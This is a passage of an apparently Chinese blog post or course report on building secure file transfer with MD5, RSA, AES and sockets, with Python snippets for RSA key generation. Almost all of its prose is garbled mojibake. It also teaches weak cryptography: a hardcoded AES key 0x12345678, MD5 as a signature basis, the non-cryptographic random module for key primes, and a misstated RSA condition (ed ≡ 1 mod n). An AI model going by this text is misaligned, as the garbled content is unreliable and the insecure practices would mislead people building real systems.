å¯†å¯†é’¥ï¼ˆAESï¼‰çš„åŠ è§£å¯†åšå‡†å¤‡ã€‚</p></li><li><p>å› ä¸ºæ˜¯åœ¨å…¬å…±ä¿¡é“ä¸­ä¼ è¾“æ•°æ®ï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨æ”»å‡»è€…å†’å……bobæ¥æ”¶æ–‡ä»¶ï¼Œæ‰€ä»¥Aliceåœ¨ä¸ä¼ è¾“æ–‡ä»¶ä¹‹å‰éœ€è¦å¯¹bobçš„èº«ä»½è¿›è¡Œè®¤è¯ï¼Œè€Œä¸”bobé˜²æ­¢è¢«æ¬ºéª—ä¹Ÿéœ€è¦å¯¹Aliceçš„èº«ä»½è¿›è¡Œè®¤è¯ï¼Œè¿™é‡Œå¯ä»¥é‡‡ç”¨ç¬¬äºŒç±»ç­¾åç®—æ³•ã€‚</p></li><li><p>åœ¨ç¡®è®¤å½¼æ­¤èº«ä»½åéœ€è¦å°†æ–‡ä»¶é€šè¿‡å…¬å…±ä¿¡é“ä¼ è¾“ï¼Œä½†æ˜¯å¯èƒ½å­˜åœ¨æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦å¯¹æ–‡ä»¶å†…å®¹åŠ å¯†ï¼Œè€ƒè™‘åˆ°åŠ å¯†é€Ÿåº¦é—®é¢˜ï¼Œæ‰€ä»¥é‡‡ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•ï¼ˆAESï¼‰ã€‚</p></li><li><p>é‡‡ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•éœ€è¦å¯†é’¥ï¼Œè€Œè¿™é‡Œä½¿ç”¨çš„å¯†é’¥çš„ä¸º<code>0x12345678</code>ã€‚å¹¶ä¸”è¿™ä¸ªå¯†é’¥ä¹Ÿéœ€è¦ä¼ ç»™bobç”¨äºè§£å¯†ï¼Œä½†æ˜¯å…¬å…±ä¿¡é“ä¸å®‰å…¨ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦å¯¹è¯¥å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚è€ƒè™‘åˆ°å¯†é’¥é•¿åº¦ä¸æ˜¯å¾ˆå¤§ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œè€Œä¸”å…¬é’¥åŠ å¯†ç®—æ³•å¯ä»¥ä¸ä¼ è¾“æ­¤æ¬¡åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ï¼Œæé«˜å®‰å…¨æ€§å’Œæ•ˆç‡ã€‚</p></li><li><p>å½“Bobæ”¶åˆ°å¯¹åº”çš„å¯†é’¥å¹¶è§£å¯†å¯†æ–‡åï¼Œéœ€è¦å‘Aliceå‘é€ä¸€ä¸ªç¡®è®¤æ”¶åˆ°çš„æ¶ˆæ¯ï¼Œé˜²æ­¢æˆªæ–­æ”»å‡»ï¼Œç¡®è®¤æ¶ˆæ¯ä¹Ÿè¦ä½¿ç”¨åˆ°ç¬¬ä¸€æ­¥ä½¿ç”¨çš„ç­¾åç®—æ³•ã€‚</p></li></ul><h1 id="ä¸‰ã€è®¾è®¡åŸç†"><a href="#ä¸‰ã€è®¾è®¡åŸç†" class="headerlink" title="ä¸‰ã€è®¾è®¡åŸç†"></a>ä¸‰ã€è®¾è®¡åŸç†</h1><p>ä»ä¸Šé¢çš„éœ€æ±‚åˆ†æå¯ä»¥çŸ¥é“ï¼Œæ•´ä¸ªç¨‹åºéœ€è¦ç”¨çš„MD5ï¼ŒRSAï¼ŒAESç®—æ³•ï¼Œæœ€åä½¿ç”¨socketç¼–ç¨‹å®ç°é€šä¿¡ã€‚</p><h2 id="3-1-MD5"><a href="#3-1-MD5" class="headerlink" title="3.1 MD5"></a>3.1 MD5</h2><p>â€‹        MD5æ˜¯hashå‡½æ•°çš„ä¸€ç§ï¼Œè€Œ Hashï¼Œä¸€èˆ¬ç¿»è¯‘åšæ•£åˆ—ã€æ‚å‡‘ï¼Œæˆ–éŸ³è¯‘ä¸ºå“ˆå¸Œï¼Œæ˜¯æŠŠä»»æ„é•¿åº¦çš„è¾“å…¥(åˆå«åšé¢„æ˜ å°„)é€šè¿‡æ•£åˆ—ç®—æ³•å˜æ¢æˆå›ºå®šé•¿åº¦çš„è¾“å‡ºï¼Œè¯¥è¾“å‡ºå°±æ˜¯æ•£åˆ—å€¼ã€‚è¿™ç§è½¬æ¢æ˜¯ä¸€ç§å‹ç¼©æ˜ å°„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ•£åˆ—å€¼çš„ç©ºé—´é€šå¸¸è¿œå°äºè¾“å…¥çš„ç©ºé—´ï¼Œä¸åŒçš„è¾“å…¥å¯èƒ½ä¼šæ•£åˆ—æˆç›¸åŒçš„è¾“å‡ºï¼Œæ‰€ä»¥ä¸å¯èƒ½ä»æ•£åˆ—å€¼æ¥ç¡®å®šå”¯ä¸€çš„è¾“å…¥å€¼ã€‚ç®€å•çš„è¯´å°±æ˜¯æ˜¯å°†ä»»æ„é•¿åº¦çš„è¾“å…¥å˜æ¢ä¸ºå›ºå®šé•¿åº¦çš„è¾“å‡ºçš„ä¸å¯é€†çš„å•å‘å¯†ç ä½“åˆ¶ã€‚</p><p>â€‹        MD5(Message-Digest Algorithm,ä¿¡æ¯æ‘˜è¦ç®—æ³•)ï¼Œæ˜¯ç”±ç¾å›½è‘—åå¯†ç å­¦å®¶Rivestè®¾è®¡çš„ä¸€ç§å¯†ç æ•£åˆ—å‡½æ•°ï¼Œå¯ä»¥å°†é•¿åº¦å°äº264æ¯”ç‰¹çš„æ¶ˆæ¯ï¼ŒæŒ‰512æ¯”ç‰¹çš„åˆ†ç»„å•ä½è¿›è¡Œå¤„ç†ï¼Œè¾“å‡ºä¸€ä¸ª128æ¯”ç‰¹çš„æ¶ˆæ¯æ‘˜è¦ã€‚</p><p>MD5 ç®—æ³•è¾“å…¥ä¸å®šé•¿åº¦ä¿¡æ¯ï¼Œè¾“å‡ºå›ºå®šé•¿åº¦ 128-bits çš„ç®—æ³•ã€‚ç»è¿‡ç¨‹åºæµç¨‹ï¼Œç”Ÿæˆå››ä¸ª 32ä½æ•°æ®ï¼Œæœ€åè”åˆèµ·æ¥æˆä¸ºä¸€ä¸ª 128-bits æ•£åˆ—ã€‚åŸºæœ¬æ–¹å¼æœ‰æ±‚ä½™ã€å–ä½™ã€è°ƒæ•´é•¿åº¦ã€ä¸é“¾æ¥å˜é‡è¿›è¡Œå¾ªç¯è¿ç®—ï¼Œ å¾—å‡ºç»“æœã€‚åŸºæœ¬æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š  </p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714095352078.png" alt="image-20210714095352078"></p><h3 id="3-1-1-æ¶ˆæ¯å¡«å……"><a href="#3-1-1-æ¶ˆæ¯å¡«å……" class="headerlink" title="3.1.1 æ¶ˆæ¯å¡«å……"></a>3.1.1 æ¶ˆæ¯å¡«å……</h3><ul><li>ä½¿æ¶ˆæ¯é•¿åº¦æ¨¡512=448å¦‚æœæ¶ˆæ¯é•¿åº¦æ¨¡512æ°ç­‰äº448ï¼Œå¢åŠ 512ä¸ªå¡«å……æ¯”ç‰¹ã€‚å³å¡«å……çš„ä¸ªæ•°ä¸º1~512ï¼Œå¡«å……æ–¹æ³•ï¼šç¬¬1æ¯”ç‰¹ä¸º1ï¼Œå…¶ä½™å…¨éƒ¨ä¸º0</li><li>å°†æ¶ˆæ¯é•¿åº¦è½¬æ¢ä¸º64æ¯”ç‰¹çš„æ•°å€¼ï¼Œå¦‚æœé•¿åº¦è¶…è¿‡64æ¯”ç‰¹æ‰€èƒ½è¡¨ç¤ºçš„æ•°æ®é•¿åº¦ï¼Œå€¼ä¿ç•™æœ€å64æ¯”ç‰¹æ·»åŠ åˆ°å¡«å……æ•°æ®åé¢ï¼Œä½¿æ•°æ®ä¸º512æ¯”ç‰¹çš„æ•´æ•°å€</li><li>512æ¯”ç‰¹æŒ‰32æ¯”ç‰¹åˆ†ä¸º16ç»„</li></ul><p>å¤„ç†è¿‡ç¨‹å¦‚ä¸‹</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714095700191.png" alt="image-20210714095700191" style="zoom: 80%;"><h3 id="3-1-2-åˆå§‹åŒ–é“¾æ¥å˜é‡"><a href="#3-1-2-åˆå§‹åŒ–é“¾æ¥å˜é‡" class="headerlink" title="3.1.2 åˆå§‹åŒ–é“¾æ¥å˜é‡"></a>3.1.2 åˆå§‹åŒ–é“¾æ¥å˜é‡</h3><p>ä½¿ç”¨4ä¸ª32ä½çš„å¯„å­˜å™¨Aï¼Œ Bï¼ŒCï¼Œ Då­˜æ”¾4ä¸ªå›ºå®šçš„32ä½æ•´å‹å‚æ•°ï¼Œç”¨äºç¬¬ä¸€è½®è¿­ä»£ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯„å­˜å™¨çš„å€¼è¦è½¬åŒ–ä¸ºå°ç«¯åºã€‚</p><pre><code class="hljs apache"><span class="hljs-attribute">A</span>=<span class="hljs-number">0</span>x<span class="hljs-number">1234567</span><span class="hljs-attribute">B</span>=<span class="hljs-number">0</span>x<span class="hljs-number">89</span>ABCDEF<span class="hljs-attribute">C</span>=<span class="hljs-number">0</span>xFEDCBA<span class="hljs-number">98</span><span class="hljs-attribute">D</span>=<span class="hljs-number">0</span>x<span class="hljs-number">76543210</span></code></pre><h3 id="3-1-3-åˆ†ç»„å¤„ç†"><a href="#3-1-3-åˆ†ç»„å¤„ç†" class="headerlink" title="3.1.3 åˆ†ç»„å¤„ç†"></a>3.1.3 åˆ†ç»„å¤„ç†</h3><ul><li>ç”±4è½®ç»„æˆï¼Œ521bitçš„æ¶ˆæ¯åˆ†ç»„Miè¢«å‡åˆ†ä¸º16ä¸ªåˆ†ç»„ï¼Œå‚ä¸æ¯è½®16æ­¥å‡½æ•°è¿ç®—ï¼Œå³æ¯è½®åŒ…æ‹¬16ä¸ªæ­¥éª¤ã€‚æ¯æ­¥çš„è¾“å…¥æ˜¯4ä¸ª32bitçš„é“¾æ¥å˜é‡å’Œ1ä¸ª32bitçš„æ¶ˆæ¯å­åˆ†ç»„ï¼Œè¾“å‡ºä¸º32ä½å€¼</li><li>ç»è¿‡4è½®å…±64æ­¥åï¼Œå¾—åˆ°çš„4ä¸ªå¯„å­˜å™¨å€¼åˆ†åˆ«ä¸è¾“å…¥é“¾æ¥å˜é‡è¿›è¡Œæ¨¡åŠ ï¼Œå³å¾—åˆ°æ­¤æ¬¡åˆ†ç»„å¤„ç†çš„è¾“å‡ºé“¾æ¥å˜é‡</li><li>4è½®æ“ä½œä¹‹å‰ï¼Œå…ˆå°†å‰ä¸€åˆ†ç»„çš„é“¾æ¥å˜é‡(Aã€Bã€Cã€Dçš„å€¼)å¤åˆ¶åˆ°å¤‡ç”¨è®°å½•å•å…ƒï¼Œä»¥ä¾¿æ‰§è¡Œæœ€åçš„æ¨¡åŠ æ“ä½œ</li></ul><p>å¤„ç†è¿‡ç¨‹å¦‚ä¸‹å›¾</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714095845995.png" alt="image-20210714095845995" style="zoom:80%;"><h3 id="3-1-4-æ­¥å‡½æ•°"><a href="#3-1-4-æ­¥å‡½æ•°" class="headerlink" title="3.1.4  æ­¥å‡½æ•°"></a>3.1.4  æ­¥å‡½æ•°</h3><p>MD5æ¯è½®åŒ…å«16æ­¥ï¼Œæ¯è½®çš„æ­¥å‡½æ•°ç›¸åŒï¼Œå³ä½¿ç”¨åŒä¸€ä¸ªéçº¿æ€§å‡½æ•°ï¼Œè€Œä¸åŒè½®çš„æ­¥å‡½æ•°ä½¿ç”¨çš„éçº¿æ€§å‡½æ•°æ˜¯ä¸åŒçš„ï¼Œå³å››è½®ä½¿ç”¨4ä¸ªä¸åŒçš„éçº¿æ€§å‡½æ•°ã€‚è®¾Xã€Yã€Zæ˜¯3ä¸ª32æ¯”ç‰¹çš„è¾“å…¥å˜é‡ï¼Œè¾“å‡ºæ˜¯ä¸€ä¸ª32æ¯”ç‰¹å˜é‡ï¼Œåˆ™è¿™4ä¸ªéçº¿æ€§å‡½æ•°Fã€Gã€Hå’ŒIå®šä¹‰ä¸ºï¼š</p><pre><code class="hljs tp">F(<span class="hljs-keyword">X</span>,<span class="hljs-keyword">Y</span>,<span class="hljs-keyword">Z</span>)=(<span class="hljs-keyword">X</span>&amp;<span class="hljs-keyword">Y</span>)|((~<span class="hljs-keyword">X</span>)&amp;<span class="hljs-keyword">Z</span>)G(<span class="hljs-keyword">X</span>,<span class="hljs-keyword">Y</span>,<span class="hljs-keyword">Z</span>)=(<span class="hljs-keyword">X</span>&amp;<span class="hljs-keyword">Z</span>)|(<span class="hljs-keyword">Y</span>&amp;(~<span class="hljs-keyword">Z</span>))H(<span class="hljs-keyword">X</span>,<span class="hljs-keyword">Y</span>,<span class="hljs-keyword">Z</span>)=<span class="hljs-keyword">X</span>^<span class="hljs-keyword">Y</span>^<span class="hljs-keyword">Z</span>I(<span class="hljs-keyword">X</span>,<span class="hljs-keyword">Y</span>,<span class="hljs-keyword">Z</span>)=<span class="hljs-keyword">Y</span>^(<span class="hljs-keyword">X</span>|(~<span class="hljs-keyword">Z</span>))</code></pre><p>MD5æ­¥å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ï¼š</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714100312140.png" alt="image-20210714100312140" style="zoom: 67%;"><p>ä¼ªéšæœºå¸¸æ•° T[ i ]ï¼Œå¯ä»¥æ¶ˆé™¤è¾“å…¥æ•°æ®çš„è§„å¾‹æ€§ï¼Œiä¸ºå¼§åº¦ï¼Œ1 â‰¤ i â‰¤ 64ï¼Œæ–¹æ¡†ä»£è¡¨å–æ•´æ•°éƒ¨åˆ†</p><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210714100450860.png" alt="image-20210714100450860"></p><p>è½®å‡½æ•°å…ˆå–å‘é‡(Aã€Bã€Cã€D)ä¸­çš„å3ä¸ªä½œä¸€æ¬¡éçº¿æ€§å‡½æ•°è¿ç®—ï¼Œæ‰€å¾—çš„ç»“æœä¸€æ¬¡åŠ ä¸Šç¬¬1ä¸ªå˜é‡ï¼Œ32bitæ¶ˆæ¯å­åˆ†ç»„å’Œ1ä¸ªä¼ªéšæœºå¸¸æ•°ï¼Œå†å°†æ‰€å¾—çš„ç»“æœå¾ªç¯å·¦ç§»æŒ‡å®šä½æ•°ï¼Œå¹¶åŠ ä¸Š(Aã€Bã€Cã€D)çš„ç¬¬äºŒä¸ªå˜é‡ï¼Œæœ€åæŠŠæ–°å€¼èµ‹ç»™å‘é‡ä¸­çš„ç¬¬1ä¸ªå˜é‡ã€‚</p><h3 id="3-1-5-ä¸»å¾ªç¯"><a href="#3-1-5-ä¸»å¾ªç¯" class="headerlink" title="3.1.5 ä¸»å¾ªç¯"></a>3.1.5 ä¸»å¾ªç¯</h3><p>â€‹    ç®—æ³•å…·ä½“æ­¥éª¤å¦‚å›¾</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714100555756.png" alt="image-20210714100555756"></p><h3 id="æ­£ç¡®æ€§éªŒè¯"><a href="#æ­£ç¡®æ€§éªŒè¯" class="headerlink" title="æ­£ç¡®æ€§éªŒè¯"></a>æ­£ç¡®æ€§éªŒè¯</h3><blockquote><p><strong>åœ¨çº¿ç½‘ç«™</strong>ï¼š<a href="https://md5jiami.bmcx.com/">https://md5jiami.bmcx.com/</a></p><p><strong>å¤„ç†å­—ç¬¦ä¸²:</strong> I love cumt very much           </p></blockquote><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714100739874.png" alt="image-20210714100739874"></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714100744577.png" alt="image-20210714100744577"></p><h2 id="3-2-RSA"><a href="#3-2-RSA" class="headerlink" title="3.2 RSA"></a>3.2 RSA</h2><p>â€‹        åœ¨Diffieå’ŒHellmanæå‡ºå…¬é’¥å¯†ç ä½“åˆ¶çš„è®¾æƒ³åï¼ŒMerkleå’ŒHellmané¦–å…ˆå…±åŒæå‡ºMHèƒŒåŒ…å…¬é’¥åŠ å¯†ä½“åˆ¶ï¼ŒéšåRivestã€Shamirã€Adlemanè”åˆæå‡ºRSAå…¬é’¥åŠ å¯†ä½“åˆ¶ã€‚RSAè™½æ™šäºMHèƒŒåŒ…å…¬é’¥åŠ å¯†ä½“åˆ¶ï¼Œä½†å®ƒæ˜¯ç¬¬ä¸€ä¸ªå®‰å…¨ã€å®ç”¨çš„å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œå·²æˆä¸ºå›½é™…æ ‡å‡†ã€‚</p><pre><code>RSAçš„åŸºç¡€æ˜¯æ•°è®ºçš„æ¬§æ‹‰å®šç†ï¼Œå®ƒçš„å®‰å…¨æ€§ä¾èµ–äºå¤§æ•´æ•°å› å­åˆ†è§£çš„å›°éš¾æ€§ã€‚ä¸”å› ä¸ºåŠ è§£å¯†æ¬¡åºå¯æ¢ï¼ŒRSAå…¬é’¥ä½³ç¾ä½“åˆ¶æ—¢å¯ç”¨äºåŠ å¯†ï¼Œä¹Ÿå¯ç”¨äºè®¾è®¡æ•°å­—ç­¾åä½“åˆ¶ã€‚</code></pre><p><strong>RSAç®—æ³•åŸç†</strong></p><p>â€‹    å®‰å…¨æ€§åŸºäºå¤§ç´ æ•°å› å­åˆ†è§£çš„å›°éš¾é—®é¢˜ï¼Œæ•´ä½“ç®—æ³•æµç¨‹ç®€å•æ¸…æ™°ï¼Œåˆ†ä¸ºå¦‚ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><p>ï¼ˆ1ï¼‰å¯†é’¥ç”Ÿæˆç®—æ³•ï¼š </p><p>â€‹    â‘  é€‰å–ä¸¤ä¸ªä¿å¯†çš„å¤§ç´ æ•°ğ‘å’Œğ‘ï¼Œæ»¡è¶³ğ‘ â‰  ğ‘ï¼Œè®¡ç®—ğ‘› = ğ‘ Ã— ğ‘, ğœ‘(ğ‘›) = (ğ‘ âˆ’ 1)(ğ‘ âˆ’ 1), ğœ‘(ğ‘›) ä¸ºğ‘›çš„æ¬§æ‹‰å‡½æ•°ã€‚ </p><p>â€‹    â‘¡ éšæœºé€‰å–æ•´æ•°ğ‘’, æ»¡è¶³1 &lt; ğ‘’ &lt; ğœ‘(ğ‘›)ä¸”gcd(ğ‘’, ğœ‘(ğ‘›)) = 1ï¼Œå³ğ‘’ä¸ğœ‘(ğ‘›)äº’ç´ ã€‚ </p><p>â€‹    â‘¢ è®¡ç®—ğ‘‘, æ»¡è¶³ğ‘’ğ‘‘ â‰¡ 1(ğ‘šğ‘œğ‘‘ (ğ‘›))ï¼Œåˆ™å…¬é’¥ä¸º(ğ‘’, ğ‘›), ç§é’¥ä¸ºğ‘‘ã€‚ </p><p>ï¼ˆ2ï¼‰åŠ å¯† å¯¹æ˜æ–‡è¿›è¡Œæ¯”ç‰¹ä¸²åˆ†ç»„ï¼Œä½¿æ¯ä¸ªåˆ†ç»„åè¿›åˆ¶å°äºğ‘› , ç„¶åå¯¹æ¯ä¸ªåˆ†ç»„ğ‘š(0 â‰¤ ğ‘š &lt; ğ‘›),è®¡ç®— ğ‘ = ğ‘šğ‘’ (ğ‘šğ‘œğ‘‘ ğ‘›)ï¼Œåˆ™å¾—åˆ°å¯†æ–‡ cã€‚ </p><p>ï¼ˆ3ï¼‰è§£å¯†  å¯¹äºå¯†æ–‡ğ‘(0 â‰¤ c &lt; n), æœ‰ğ‘š = ğ‘ğ‘‘ (ğ‘šğ‘œğ‘‘ ğ‘›)ï¼Œ å³å¯å¾—åˆ°æ˜æ–‡mã€‚</p><h3 id="3-2-1-å¤§ç´ æ•°ç”Ÿæˆ"><a href="#3-2-1-å¤§ç´ æ•°ç”Ÿæˆ" class="headerlink" title="3.2.1 å¤§ç´ æ•°ç”Ÿæˆ"></a>3.2.1 å¤§ç´ æ•°ç”Ÿæˆ</h3><p>è¦å»å¯»æ‰¾ä¸€ä¸ªä»»æ„çš„å¤§ç´ æ•°æ˜¯å¾ˆå›°éš¾çš„äº‹,ä½†æ˜¯å¯æ˜¯å…ˆéšæœºç”Ÿæˆä¸€ä¸ªå¤§å¥‡æ•°,å†é€šè¿‡å¤šæ¬¡ç´ æ€§æ£€éªŒæ£€æµ‹æ˜¯å¦ä¸ºå®¿èˆ,å¦‚æœå¤šæ¬¡æ£€æµ‹éƒ½ä¸ºç´ æ•°åˆ™å¯ç¡®å®šä¸ºç´ æ•°.</p><h4 id="éšæœºç”Ÿæˆå¤§å¥‡æ•°"><a href="#éšæœºç”Ÿæˆå¤§å¥‡æ•°" class="headerlink" title="éšæœºç”Ÿæˆå¤§å¥‡æ•°"></a>éšæœºç”Ÿæˆå¤§å¥‡æ•°</h4><p>æ­¤ç®—æ³•å¯ä»¥æ ¹æ®éœ€è¦ç”Ÿæˆå›ºå®šä½æ•°çš„æ•°,å½“ç”Ÿæˆå¥‡æ•°å,ä¼šé€šè¿‡ç´ æ€§æ£€éªŒ,å¦‚æœé€šè¿‡æ£€æŸ¥,åˆ™ç´ æ•°ç”ŸæˆæˆåŠŸ</p><pre><code class="hljs python"><span class="hljs-comment"># ç”Ÿæˆç´ æ•° å…ˆç”Ÿæˆ1024ä½çš„å¥‡æ•°ï¼Œå†è¿›è¡Œç´ æ€§æ£€éªŒï¼Œé€šè¿‡åˆ™ç”Ÿæˆè¯¥ç´ æ•°</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genPrime</span>(<span class="hljs-params">b=<span class="hljs-number">1024</span></span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:                             <span class="hljs-comment"># è®¾ç½®æ­»å¾ªç¯ç›´åˆ°ç”Ÿæˆç´ æ•°æ‰é€€å‡º</span>        res = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b-<span class="hljs-number">2</span>):            res += <span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))        res += <span class="hljs-string">&quot;1&quot;</span>                              <span class="hljs-comment"># æœ€åä¸€ä½ä¸º1ä¿è¯ä¸ºå¥‡æ•°</span>        res = <span class="hljs-built_in">int</span>(res,<span class="hljs-number">2</span>)        <span class="hljs-keyword">if</span> miller_rabin(res):            <span class="hljs-keyword">return</span> res                          <span class="hljs-comment"># ç›´åˆ°è¯¥æ•°é€šè¿‡ç´ æ•°æ£€éªŒæ‰æ¨å‡ºå¾ªç¯</span></code></pre><h4 id="Miller-Rabinç´ æ€§æ£€éªŒ"><a href="#Miller-Rabinç´ æ€§æ£€éªŒ" class="headerlink" title="Miller-Rabinç´ æ€§æ£€éªŒ"></a>Miller-Rabinç´ æ€§æ£€éªŒ</h4><p>â€‹    åœ¨æœ¬å®éªŒä¸­ï¼Œæˆ‘ä½¿ç”¨äº† Miller-Rabin ç´ æ€§æ£€éªŒç»“åˆéšæœºæ•°çš„ç”Ÿæˆæ¥å¾—åˆ°æ‰€éœ€è¦çš„å¤§ç´ æ•°ï¼Œ å®ƒæ˜¯ä¸€ä¸ªåŸºäºæ¦‚ç‡çš„ç®—æ³•ï¼Œæ˜¯è´¹é©¬å°å®šç†çš„ä¸€ä¸ªæ”¹è¿›ã€‚  ç®€å•æ¥è¯´ï¼Œ è¦æµ‹è¯•ğ‘›æ˜¯å¦ä¸ºç´ æ•°ï¼Œé¦–å…ˆå°†ğ‘› - 1åˆ†è§£ä¸º2ğ‘ ğ‘‘ã€‚ åœ¨æ¯æ¬¡æµ‹è¯•å¼€å§‹æ—¶ï¼Œå…ˆéšæœºé€‰ä¸€ä¸ªä»‹äº[1, ğ‘› - 1]çš„æ•´æ•°ğ‘ï¼Œä¹‹åå¦‚æœå¯¹æ‰€æœ‰çš„ğ‘Ÿ âˆˆ [0, ğ‘  - 1]ï¼Œ è‹¥ğ‘ğ‘‘ â‰  1(ğ‘šğ‘œğ‘‘ ğ‘›)ä¸”ğ‘^((2^ğ‘Ÿ)*ğ‘‘) â‰ -1(ğ‘šğ‘œğ‘‘ ğ‘›)ï¼Œåˆ™ğ‘›æ˜¯åˆæ•°ã€‚å¦åˆ™ï¼Œ ğ‘›æœ‰3/4çš„æ¦‚ç‡ä¸ºç´ æ•°ï¼Œéšç€å¢åŠ æµ‹è¯•çš„æ¬¡æ•°ï¼Œæ˜¯ç´ æ•°çš„æ¦‚ç‡ä¼šè¶Šæ¥è¶Šé«˜ï¼Œå½“è¾¾åˆ°æŸä¸€æ¬¡æ•°æ—¶ï¼Œä¸ºç´ æ•°çš„æ¦‚ç‡å¯ä»¥æ¥è¿‘100%ã€‚</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">miller_rabin</span>(<span class="hljs-params">n</span>):</span>    s = n - <span class="hljs-number">1</span>    t = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> s % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:  <span class="hljs-comment"># n,s,tä¹‹é—´çš„å…³ç³»ä¸º n = 2^s * t</span>        s = s // <span class="hljs-number">2</span>        t += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> trials <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):   <span class="hljs-comment"># å¯ä»¥å¤šå¢åŠ å‡ è½®ä¿è¯å¤§æ¦‚ç‡ä¸ºç´ æ•°</span>        a = random.randrange(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>) <span class="hljs-comment"># éšæœºç”Ÿæˆa</span>        v = <span class="hljs-built_in">pow</span>(a, s, n)               <span class="hljs-comment"># éªŒè¯ a^(n-1) mod n</span>        <span class="hljs-keyword">if</span> v != <span class="hljs-number">1</span>:            i = <span class="hljs-number">0</span>            <span class="hljs-keyword">while</span> v != (n - <span class="hljs-number">1</span>):                <span class="hljs-keyword">if</span> i == t - <span class="hljs-number">1</span>:                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>                <span class="hljs-keyword">else</span>:                    i = i + <span class="hljs-number">1</span>                    v = (v ** <span class="hljs-number">2</span>) % n    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre><h3 id="3-2-2-ç”Ÿæˆå…¬é’¥e"><a href="#3-2-2-ç”Ÿæˆå…¬é’¥e" class="headerlink" title="3.2.2 ç”Ÿæˆå…¬é’¥e"></a>3.2.2 ç”Ÿæˆå…¬é’¥e</h3><p>ğ‘’éœ€è¦æ»¡è¶³1 &lt; ğ‘’ &lt; ğœ‘(ğ‘›)ä¸”gcd(ğ‘’, ğœ‘(ğ‘›)) = 1ï¼Œå³ğ‘’ä¸ğœ‘(ğ‘›)äº’ç´ ã€‚ </p><p>è¿™é‡Œä¸ºäº†ä¿è¯å®‰å…¨æ€§ï¼Œè®¾ç½®äº†eçš„å€¼ä¸èƒ½å°äº2000ã€‚</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genE</span>(<span class="hljs-params">phi_n</span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        e = genPrime(b=random.randint(<span class="hljs-number">3</span>,<span class="hljs-number">13</span>))  <span class="hljs-comment">#éšæœºç”Ÿæˆe</span>        <span class="hljs-keyword">if</span> e &lt; <span class="hljs-number">2000</span> :                  <span class="hljs-comment"># eä¸èƒ½å¤ªå°</span>            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">if</span> phi_n%e != <span class="hljs-number">0</span>:               <span class="hljs-comment"># ä¿è¯eä¸èƒ½è¢«phiæ•´é™¤</span>            <span class="hljs-keyword">return</span> e</code></pre><h3 id="3-2-3-è®¡ç®—ç§é’¥d"><a href="#3-2-3-è®¡ç®—ç§é’¥d" class="headerlink" title="3.2.3 è®¡ç®—ç§é’¥d"></a>3.2.3 è®¡ç®—ç§é’¥d</h3><h4 id="æ¨¡é‡å¤å¹³æ–¹æ³•"><a href="#æ¨¡é‡å¤å¹³æ–¹æ³•" class="headerlink" title="æ¨¡é‡å¤å¹³æ–¹æ³•"></a>æ¨¡é‡å¤å¹³æ–¹æ³•</h4><p>ä¸ºäº†æé«˜å¤§æ•°æ¨¡æ—¶çš„è®¡ç®—é€Ÿåº¦ï¼Œè¿™é‡Œé‡‡ç”¨çš„æ—¶æ¨¡é‡å¤å¹³æ–¹æ³•ã€‚</p><p>ç®—æ³•ä¼ªä»£ç å¦‚å›¾</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714111320464.png" alt="image-20210714111320464" style="zoom:67%;"><h4 id="è®¡ç®—ç§é’¥d"><a href="#è®¡ç®—ç§é’¥d" class="headerlink" title="è®¡ç®—ç§é’¥d"></a>è®¡ç®—ç§é’¥d</h4><p>åœ¨RSAç®—æ³•ä¸­æ±‚ç§é’¥ä¸­çš„æ•´æ•°dæ—¶ï¼Œéœ€è¦ä½¿å¾— (e * d ) % m = 1ï¼Œè¯¥æ–¹ç¨‹ç­‰ä»·äº e * d = 1 + y * m ï¼Œä¹Ÿç­‰ä»·äº e * d - y * m = 1ã€‚ï¼ˆéƒ½ä¸ºæ•´æ•°ï¼‰</p><p>å› 